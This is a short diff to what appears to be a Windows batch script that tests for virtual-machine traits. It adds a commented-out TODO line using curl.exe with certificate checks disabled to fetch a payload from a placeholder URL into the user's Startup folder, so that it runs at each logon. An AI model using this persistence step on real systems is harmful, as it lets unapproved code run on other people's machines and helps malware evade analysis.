@@ -80,6 +80,7 @@ echo [NOT DETECTED] This system does not exhibit common virtual machine characte
 :: TODO
 :: Persistence as user
 ::    Download script to startup
+::        curl.exe -kL <urltopayload> -o %USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startupPersistance.bat
 
 :end
 pause
